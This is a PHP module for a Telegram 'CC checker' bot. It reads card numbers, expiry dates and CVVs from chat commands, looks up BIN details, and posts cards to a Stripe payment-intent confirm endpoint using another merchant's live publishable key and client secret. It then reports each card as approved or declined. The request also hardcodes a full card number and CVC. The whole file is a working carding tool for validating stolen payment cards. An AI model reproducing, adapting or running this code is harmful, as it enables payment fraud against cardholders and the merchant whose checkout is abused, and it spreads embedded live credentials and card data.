<?php 
if ((strpos($message, "/chk") === 0)||(strpos($message, "!chk") === 0)||(strpos($message, ".chk") === 0)){
  

$mail = random_strings(5)."@gmail.com";
//---------------------------------------//
$url = 'https://bins.antipublic.cc/bins/'.$cc.'';
  $fim = json_decode(file_get_contents($url), true);
  $bin = $fim["bin"];
  $brand = $fim["brand"];
  $country = $fim["country"];
  $country_name = $fim["country_name"];
  $country_flag = $fim["country_flag"];
  $country_currencies = $fim['country_currencies'];
  $bank = $fim['bank'];
  $level = $fim["level"];
  $type = $fim["type"];
# -------------------- [PROXY SECTION] -------------------#

$ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
          'Host: m.stripe.com',
          'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
          'Accept: */*',
          'Accept-Language: en-US,en;q=0.5',
          'Content-Type: text/plain;charset=UTF-8',
          'Origin: https://m.stripe.network',
          'Referer: https://m.stripe.network/inner.html'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
          curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
          curl_setopt($ch, CURLOPT_POSTFIELDS, "");
          $res = curl_exec($ch);
          $muid = trim(strip_tags(capture($res,'"muid":"','"')));
          $sid = trim(strip_tags(capture($res,'"sid":"','"')));
          $guid = trim(strip_tags(capture($res,'"guid":"','"')));
          
          $session = trim(strip_tags(capture($res,'"session_id":"','"')));

//---------------------------------------//
$upd = urlencode("
➜ 𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 𝙎𝙏𝘼𝙍𝙏𝙀𝘿...
");
$sss = reply_to($chatId,"$upd",$messageId);
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];



if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
# -------------------- [PROXY SECTION] -------------------#
//==================[Randomizing Details-END]======================//  
function value($str,$find_start,$find_end)
{
    $start = strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}
function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
  
    $ccs  = getCards($message);
  if(empty($ccs))
  {
    $upd = urlencode("
𝗖𝗖 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗 ❌...
");
edit_message($chatId,"$upd ",$message_id_1); 
    exit();
  }
    $cc = $ccs[0];
    $mes = $ccs[1];
    $ano = $ccs[2];
    $cvv = $ccs[3];
    $lista = "$ccs[0]|$ccs[1]|$ccs[2]|$ccs[3]";
##################
$upd = urlencode("
𝙒𝘼𝙄𝙏𝙄𝙉𝙂 𝙁𝙊𝙍 𝙍𝙀𝙎𝙐𝙇𝙏𝙎...
");
edit_message($chatId,"$upd ",$message_id_1); 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3NcbDwAmJ8OoyaNY0xULD59E/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'return_url=https%3A%2F%2Fbuy-eu.piano.io%2Fcheckout%2Foffer%2FrestoreCheckout%3Foid%3DP0MGgHeammjXhviBCeD1eqCBIsDZsVZT&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[type]=card&payment_method_data[card][number]=4033+0600+2978+0977&payment_method_data[card][cvc]=322&payment_method_data[card][exp_year]=28&payment_method_data[card][exp_month]=06&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F915a1c8b77%3B+stripe-js-v3%2F915a1c8b77%3B+payment-element&payment_method_data[time_on_page]=270031&payment_method_data[guid]=bf0e660a-36b6-45b3-babb-05f7bc1647ed70c952&payment_method_data[muid]=590853c1-b963-49dc-88f1-89cc6bf6e18a5806b9&payment_method_data[sid]=22898acd-e08e-4263-adfb-6fb91e283766e74871&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51M6shCCJYAlz7GWa6Sgo3SCkaVNRiu5mdD1b9ZcBLwhIkrMTewe12abGzfSyprTfltilSPRlGz1dNRKZZKpzpHGw00iGNpc8LS&_stripe_account=acct_1GxF6CAmJ8OoyaNY&client_secret=pi_3NcbDwAmJ8OoyaNY0xULD59E_secret_wdbwdC084ri6UqQb2DGWbK7fE');

$response = curl_exec($ch);
  
  $result2 = curl_exec($ch);
  $req_2 = json_decode($result2, true);
  if (isset($req_2['message'])) {
  $errormessage = $req_2['error']['message'] . ' ' . $req_2['error']['code']; 

  } else {
  $errormessage = $req_2['status'];
  
  }     
  
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $time = substr_replace($time, '',4);    
  
  // $bin = $fim["bin"];
  // $brand = $fim["brand"];
  // $country = $fim["country"];
  // $country_name = $fim["country_name"];
  // $country_flag = $fim["country_flag"];
  // $country_currencies = $fim['country_currencies'];
  // $bank = $fim['bank'];
  // $level = $fim["level"];
  // $type = $fim["type"];
  
  if ($req_2['status'] == 'succeeded') {
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "哦▬▬▬▬「xd」▬▬▬▬哦
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Approved ✅
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Approved ✅
  哦▬▬▬▬「𝐵𝑖𝑛 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
  哦▬▬▬▬「𝑈𝑠𝑒𝑟 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'balance_insufficient')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "「PENE BOT」
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Approved ✅
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your card has an insufficient balance
 
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'insufficient_funds')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "「PENE BOT」
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Approved ✅
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your card has an insufficient funds
 
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]

  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'incorrect_cvc')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "哦▬▬▬▬「PENE BOT」▬▬▬▬哦
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Approved ✅
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your Card security code is incorrect
  哦▬▬▬▬「𝐵𝑖𝑛 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]

  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'card_declined')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Declined ❌
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your Card Was Declined
  哦▬▬▬▬「𝐵𝑖𝑛 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
  哦▬▬▬▬「𝑈𝑠𝑒𝑟 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'expired_card')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Declined ❌
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your Card has expir
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
 
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'incorrect_number')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Declined ❌
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your Card Number is Incorrect
  
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
 
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'invalid_expiry_month')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Declined ❌
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your Card has an invalid expiry month
  
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
  
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'requires_action')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Declined ❌
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your Card Was Declined [2]
  哦▬▬▬▬「𝐵𝑖𝑛 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
  
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif(strpos($result2, 'invalid_expiry_year')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Declined ❌
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your card has an invalid expiry year
  哦▬▬▬▬「𝐵𝑖𝑛 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
  哦▬▬▬▬「𝑈𝑠𝑒𝑟 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip
  GATE BY @Sintgpremium",
  'disable_web_page_preview' => 'true',
  'parse_mode' => 'html',
  ]);
  return;
  }
  elseif (strpos($result2, 'invalid_cvc')) {
  
  bot('editMessageText', [
  'chat_id' => $chat_id,
  'message_id' => $messageidtoedit,
  'text' => "
  𝐶𝐶:  <code>$lista</code>
  𝑆𝑡𝑎𝑡𝑢𝑠: Approved ✅
  𝑅𝑒𝑠𝑝𝑜𝑛𝑠𝑒: Your Card security code is invalid
  哦▬▬▬▬「𝐵𝑖𝑛 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  → Bank details
  𝐵𝑖𝑛: $bin - $yupe
  𝐵𝑎𝑛𝑘: $bank
  𝐶𝑜𝑢𝑛𝑡𝑟𝑦: $country_name [$country_flag]
  哦▬▬▬▬「𝑈𝑠𝑒𝑟 𝐷𝑒𝑡𝑎𝑖𝑙𝑠」▬▬▬▬哦
  𝑈𝑠𝑒𝑟 - @$username [$Rank]
  𝑃𝑟𝑜𝑥𝑦 - $ip>
  GATE BY @Sintgpremium",
  'parse_mode' => 'html',
  ]);
  }
  
  else{
  bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
  'text'=>"$errormessage",
  'parse_mode'=>'html',
  'disable_web_page_preview'=>'true'
  
  ]);}
  
  }else{
  bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
  'text'=>"<b> PENDEJO INGRESASTE MAL HDP ATT @Sintgpremium</b>",
  'parse_mode'=>'html',
  'disable_web_page_preview'=>'true'
  
  ]);
  }

  
    
  

?>
 